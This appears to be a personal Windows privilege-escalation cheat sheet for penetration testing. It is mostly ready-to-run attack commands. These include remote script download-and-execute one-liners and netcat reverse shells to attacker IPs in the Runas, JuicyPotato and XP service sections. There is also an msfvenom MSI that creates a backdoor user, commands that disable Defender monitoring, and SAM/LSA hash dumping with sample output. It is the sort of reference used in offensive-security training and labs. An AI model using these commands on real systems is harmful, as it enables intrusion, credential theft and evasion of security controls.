# Windows PrivEsc



My Methodology on that when I got user shell on machine before I start learning more.

- Upload and run winPEAS.bat for enumeration and going further with it's output.
- Getting MSF meterpreter shell and try get_system
- Listing running processes and searching for CVEs
- Living Off The Land Binaries and Scripts (and also Libraries) : https://lolbas-project.github.io/

# Enumeration

**Manual Check**

```powershell
C:\> whoami 
client251\student

C:\> net user student
C:\> net user
C:\> hostname
C:\> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" #OS info
C:\> gwmi win32_operatingsystem | % caption

C:\> tasklist /SVC #Running processes

C:\> ipconfig /all #Network info
C:\> route print   #Routing table

C:\> netstat -ano  #Running Net services + PID
c:\>tasklist | findstr 660 #660 PID from netstat

C:\> netsh advfirewall show currentprofile 					#Firewall Profile
C:\> netsh advfirewall firewall show rule name=all	#Firewall Rules

C:\> schtasks /query /fo LIST /v 										#Scheduled Tasks 

C:\> wmic qfe get Caption, Description, HotFixID, InstalledOn	#Patched Updates
C:\> wmic product get name, version, vendor 									#Installed Apps

C:\> accesschk.exe -uws "Everyone" "C:\Program Files"				 #Open For all
C:\> Powershell.exe Get-ChildItem "C:\Program Files" -R ecurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}

C:\> mountvol			#Show mounted drives

PS C:\> driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Dis
play Name’, ‘Start Mode’, Path   #Drivers and kernel modules

PS C:\> Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, D riverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}  #Drivers and kernel modules

C:\> icacls "C:\Program Files\Serviio\bin\ServiioService.exe" #check for SIDs
C:\> 
C:\> 



PS C:temp> iex(new-object net.webclient).downloadstring('http://10.10.14.5/Sherlock.ps1')
PS C:temp> Find-AllVulns
OR
c:\>powershell.exe -exec bypass -Command "& {Import-Module .\exp2.ps1; Invoke-MS16-032}"


#search for password in registry
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K



Powershell read secret files
$credential = Import-CliXml -Path C:\Data\Users\app\user.txt
$credential.GetNetworkCredential().Password



# check status of Defender
PS C:\> Get-MpComputerStatus

# disable Real Time Monitoring
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true

# Default Writeable Folders
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

**Automated Check**:

**[windows-privesc-check2](https://github.com/pentestmonkey/windows-privesc-check)**

```powershell
windows-privesc-check2.exe --dump -a
```



# Insecure File Permissions

- Get running Services

  ```powershell
  Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
  ```

- Check the suspected service **owners**

  ```powershell
  icacls "C:\Program Files\Serviio\bin\ServiioService.exe"
  ```

- Replace the exe with malicious one and restart the service, If no permission for service restart, restart machine, OR wait until service get restarted.

- Check if service has auto start flag, If you decided to restart machine

  ```powershell
  wmic service where caption="Serviio" get name, caption, state, startm ode
  ```

- Restart Machine

  ```powershell
  shutdown /r /t 0
  ```

  

## Unquoted Service Paths

The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.

```
# Using WMIC
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

# Using sc
sc query
sc qc service name

# Look for Binary_path_name and see if it is unquoted.
```

##### Example

For `C:\Program Files\something\legit.exe`, Windows will try the following paths first:

- `C:\Program.exe`
- `C:\Program Files.exe`



##### Exploits

- Metasploit exploit : `exploit/windows/local/trusted_service_path`
- PowerUp exploit

```
# find the vulnerable application
C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"

...
[*] Checking for unquoted service paths...
ServiceName   : BBSvc
Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
...

# automatic exploit
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

## Looting for passwords

##### SAM and SYSTEM files

```
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Generate a hash file for John using `pwdump` or `samdump2`.

```
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
```

Then crack it with `john -format=NT /root/sam.txt`.

##### Search for file contents

```
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

## AlwaysInstallElevated

Check if these registry values are set to "1".

```
$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Then create an MSI package and install it.

```
$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
$ msiexec /quiet /qn /i C:\evil.msi
```

Technique also available in Metasploit : `exploit/windows/local/always_install_elevated`



## Runas

Use the `cmdkey` to list the stored credentials on the machine.

```powershell
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Then you can use `runas` with the `/savecred` options in order to use the saved credentials. The following example is calling a remote binary via an SMB share.

```powershell
C:\> runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"

C:\> runas /user:Administrator /savecred "nc.exe -e cmd.exe 10.10.16.125 4433"

```

Using `runas` with a provided set of credential.

```powershell
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```



## Juciypotato

Evil.bat

```bash
c:\inetpub\wwwroot\nc.exe 192.168.119.122 4433 -e cmd.exe
```

Juicy upload then run

```bash
JuicyPotato.exe -l 4433 -p c:\inetpub\wwwroot\priv.bat -t * -c {C49E32C6-BC8B-11d2-85D4-00105A1F8304}
```





### Password Dumpers

##### pwdump.exe

At present pwdump can dump passwords for Windows 2k/XP/2003/Vista/2008.

then crack the hashes --> LM hashes

```bash
root@kali:~# pwdump system sam
Administrator:500:41aa818b512a8c0e72381e4c174e281b:1896d0a309184775f67c14d14b5c365a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:667d6c58d451dbf236ae37ab1de3b9f7:af733642ab69e156ba0c219d3bbc3c83:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8dffa305e2bee837f279c2c0b082affb:::
```

```powershell
c:/> Pwdump.exe localhost

Administrator:500:NO PASSWORD*********************:3194891312029EF822116B418563087F:::
bob:1004:F9955E274D35F503BB4798EF9CA65D2D:FF79DB8ED6FE21369790A94B5EECD8E0:::
Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::
HelpAssistant:1000:05FA67EAEC4D789EC4BD52F48E5A6B28:2733CDB0D8A1FEC3F976F3B8AD1DEEEF:::
IUSR_BOB:1005:AD494FC8F015FDDB4D9497B508477485:2370BD19F77F088CF1540624C91BE101:::
IWAM_BOB:1006:170B37B9818316ABC9813AABB4DCF396:E4BE24494F363A2C015BF08B2453129D:::
pwn:1008:32F376AC60B95060AAD3B435B51404EE:4642E5327B669250C11A5690E1EDD015:::
SUPPORT_388945a0:1002:NO PASSWORD*********************:0F7A50DD4B95CEC4C1DEA566F820F4E7:::
```



##### lsadump

```bash
root@kali:~# lsadump system security
_SC_ALG

_SC_Dnscache

_SC_upnphost

20ed87e2-3b82-4114-81f9-5e219ed4c481-SALEMHELPACCOUNT

_SC_WebClient

_SC_RpcLocator

0083343a-f925-4ed7-b1d6-d95d17a0b57b-RemoteDesktopHelpAssistantSID
0000   01 05 00 00 00 00 00 05 15 00 00 00 B6 44 E4 23    .............D.#
0010   F4 50 BA 74 07 E5 3B 2B E8 03 00 00                .P.t..;+....

0083343a-f925-4ed7-b1d6-d95d17a0b57b-RemoteDesktopHelpAssistantAccount
0000   00 38 00 48 00 6F 00 31 00 49 45 00 4A 00 26 00    E.J.&.8.H.o.1.I.
0010   00 63 00 72 00 48 00 68 00 53 6B 00 00 00          h.S.c.r.H.k...
```





### Windows XP SP0/SP1 Privilege Escalation to System

```powershell
sc qc upnphost
sc qc SSDPSRV

sc config upnphost binpath= "C:\Inetpub\wwwroot\nc.exe 192.168.119.122 4433 -e C:\WINDOWS\System32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc qc upnphost
net start upnphost

On the new shell
C:\Inetpub\wwwroot\nc.exe 192.168.119.122 4422 -e C:\WINDOWS\System32\cmd.exe

```





# Suspicious Privilages

```
SeBackupPrivilege
SeLoadDriverPrivilege
SeImpersonate

```

